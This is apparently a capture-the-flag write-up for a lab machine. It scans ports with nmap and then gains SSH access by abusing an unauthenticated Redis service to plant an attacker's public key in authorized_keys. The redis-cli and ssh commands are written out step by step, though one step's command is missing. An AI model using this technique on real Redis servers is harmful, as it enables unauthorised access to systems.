Starting with nmap we can see some valuable output.

**-p-** to scan all 65535 ports and **-sV** for standard service detection:

We are most likely going to interact with SSH since the port is open. üíÅ‚Äç‚ôÇÔ∏è

I tried couple exploits for Webmin but apparently they are not working without valid credentials.

After poking Redis service for a while I came up to a great guide/cheatsheet for pentesting Redis: <https://book.hacktricks.xyz/pentesting/6379-pentesting-redis>

> Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker. Several times redis will be configured to be accessible anonymously. In this case you won't need to use any username and password.

Sounds great! So let's abuse that and follow the guide:

Install redis-tools: `sudo apt-get install redis-tools` and to interact with Redis: `redis-cli -h <IP>`

1. Generate a ssh public-private key pair on your pc: `ssh-keygen -t rsa`
2. Write the public key to a file: `(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt`
3. Import the file into redis: `cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit`
4. Save the public key to the **authorized_keys** file on redis server:

It works! We can ssh to the redis server with private key: `ssh -i id_rsa redis@10.10.10.160`
